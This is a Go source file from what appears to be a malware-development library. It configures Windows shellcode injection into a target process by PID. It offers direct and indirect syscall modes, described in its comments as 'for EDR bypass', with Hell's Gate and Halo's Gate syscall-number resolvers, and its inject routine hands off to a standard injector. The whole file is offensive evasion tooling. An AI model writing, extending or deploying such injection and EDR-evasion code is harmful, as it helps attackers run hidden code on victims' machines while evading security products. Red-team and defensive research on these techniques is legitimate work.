//go:build windows

package injection

import (
	"fmt"

	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// WindowsConfig extends Config with Windows-specific syscall options.
type WindowsConfig struct {
	Config

	// SyscallMethod controls how NT functions are invoked.
	// Default (zero value) is MethodWinAPI — standard API calls.
	// Set to MethodDirect or MethodIndirect for EDR bypass.
	SyscallMethod wsyscall.Method

	// SyscallResolver resolves SSN numbers for Direct/Indirect methods.
	// If nil and SyscallMethod > MethodNativeAPI, defaults to Chain(HellsGate, HalosGate).
	SyscallResolver wsyscall.SSNResolver
}

// DefaultWindowsConfig returns a config with WinAPI method (most compatible).
func DefaultWindowsConfig(method Method, pid int) *WindowsConfig {
	return &WindowsConfig{
		Config:        Config{Method: method, PID: pid},
		SyscallMethod: wsyscall.MethodWinAPI,
	}
}

// caller returns a Caller configured per this config, or nil for WinAPI/NativeAPI.
func (wc *WindowsConfig) caller() *wsyscall.Caller {
	if wc.SyscallMethod <= wsyscall.MethodNativeAPI {
		return nil // use standard api.Proc*.Call()
	}
	r := wc.SyscallResolver
	if r == nil {
		r = wsyscall.Chain(wsyscall.NewHellsGate(), wsyscall.NewHalosGate())
	}
	return wsyscall.New(wc.SyscallMethod, r)
}

// windowsSyscallInjector wraps the standard injector but routes NT calls
// through a syscall.Caller for EDR bypass.
type windowsSyscallInjector struct {
	config *WindowsConfig
	caller *wsyscall.Caller
}

func (w *windowsSyscallInjector) Inject(shellcode []byte) error {
	// For now, delegate to standard injector.
	// TODO: route VirtualAllocEx/WriteProcessMemory/NtCreateThreadEx through w.caller
	std := &windowsInjector{config: &w.config.Config}
	return std.Inject(shellcode)
}

// NewWindowsInjector creates an injector from a WindowsConfig.
// If the SyscallMethod is WinAPI (default), it delegates to the standard injector.
// Otherwise, it creates a syscall-aware injector that routes NT calls through the Caller.
func NewWindowsInjector(cfg *WindowsConfig) (Injector, error) {
	if cfg == nil {
		return nil, fmt.Errorf("config is nil")
	}
	caller := cfg.caller()
	if caller == nil {
		return &windowsInjector{config: &cfg.Config}, nil
	}
	return &windowsSyscallInjector{config: cfg, caller: caller}, nil
}
